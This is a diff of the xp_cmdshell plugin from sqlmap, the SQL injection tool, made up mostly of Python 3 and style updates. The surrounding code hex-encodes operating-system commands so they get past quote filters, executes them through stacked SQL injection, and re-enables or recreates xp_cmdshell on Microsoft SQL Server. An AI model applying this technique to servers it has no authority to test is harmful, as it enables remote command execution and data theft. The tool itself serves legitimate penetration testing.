@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
@@ -15,15 +15,17 @@ from lib.core.common import isListLike
 from lib.core.common import isNoneValue
 from lib.core.common import isNumPosStrValue
 from lib.core.common import isTechniqueAvailable
-from lib.core.common import pushValue
 from lib.core.common import popValue
+from lib.core.common import pushValue
 from lib.core.common import randomStr
 from lib.core.common import readInput
 from lib.core.common import wasLastResponseDelayed
-from lib.core.convert import hexencode
+from lib.core.compat import xrange
+from lib.core.convert import encodeHex
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
+from lib.core.decorators import stackedmethod
 from lib.core.enums import CHARSET_TYPE
 from lib.core.enums import DBMS
 from lib.core.enums import EXPECTED
@@ -33,7 +35,7 @@ from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.core.threads import getCurrentThreadData
 from lib.request import inject
 
-class XP_cmdshell:
+class XP_cmdshell(object):
     """
     This class defines methods to deal with Microsoft SQL Server
     xp_cmdshell extended procedure for plugins.
@@ -96,6 +98,7 @@ class XP_cmdshell:
 
         return wasLastResponseDelayed()
 
+    @stackedmethod
     def _xpCmdshellTest(self):
         threadData = getCurrentThreadData()
         pushValue(threadData.disableStdOut)
@@ -134,7 +137,7 @@ class XP_cmdshell:
 
         for line in lines:
             echoedLine = "echo %s " % line
-            echoedLine += ">> \"%s\%s\"" % (tmpPath, randDestFile)
+            echoedLine += ">> \"%s\\%s\"" % (tmpPath, randDestFile)
             echoedLines.append(echoedLine)
 
         for echoedLine in echoedLines:
@@ -163,9 +166,12 @@ class XP_cmdshell:
         # Obfuscate the command to execute, also useful to bypass filters
         # on single-quotes
         self._randStr = randomStr(lowercase=True)
-        self._cmd = "0x%s" % hexencode(cmd, conf.encoding)
         self._forgedCmd = "DECLARE @%s VARCHAR(8000);" % self._randStr
-        self._forgedCmd += "SET @%s=%s;" % (self._randStr, self._cmd)
+
+        try:
+            self._forgedCmd += "SET @%s=%s;" % (self._randStr, "0x%s" % encodeHex(cmd, binary=False))
+        except UnicodeError:
+            self._forgedCmd += "SET @%s='%s';" % (self._randStr, cmd)
 
         # Insert the command standard output into a support table,
         # 'sqlmapoutput', except when DBMS credentials are provided because
@@ -214,14 +220,14 @@ class XP_cmdshell:
             if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
                 output = inject.getValue(query, resumeValue=False, blind=False, time=False)
 
-            if (output is None) or len(output)==0 or output[0] is None:
+            if (output is None) or len(output) == 0 or output[0] is None:
                 output = []
                 count = inject.getValue("SELECT COUNT(id) FROM %s" % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
 
                 if isNumPosStrValue(count):
                     for index in getLimitRange(count):
-                        query = agent.limitQuery(index, query, self.tblField)
-                        output.append(inject.getValue(query, union=False, error=False, resumeValue=False))
+                        limitedQuery = agent.limitQuery(index, query, self.tblField)
+                        output.append(inject.getValue(limitedQuery, union=False, error=False, resumeValue=False))
 
             inject.goStacked("DELETE FROM %s" % self.cmdTblName)
 
@@ -264,7 +270,7 @@ class XP_cmdshell:
                         kb.xpCmdshellAvailable = True
 
                     else:
-                        logger.warn("xp_cmdshell re-enabling failed")
+                        logger.warning("xp_cmdshell re-enabling failed")
 
                         logger.info("creating xp_cmdshell with sp_OACreate")
                         self._xpCmdshellConfigure(0)
@@ -277,7 +283,7 @@ class XP_cmdshell:
                         else:
                             warnMsg = "xp_cmdshell creation failed, probably "
                             warnMsg += "because sp_OACreate is disabled"
-                            logger.warn(warnMsg)
+                            logger.warning(warnMsg)
 
             hashDBWrite(HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE, kb.xpCmdshellAvailable)
 
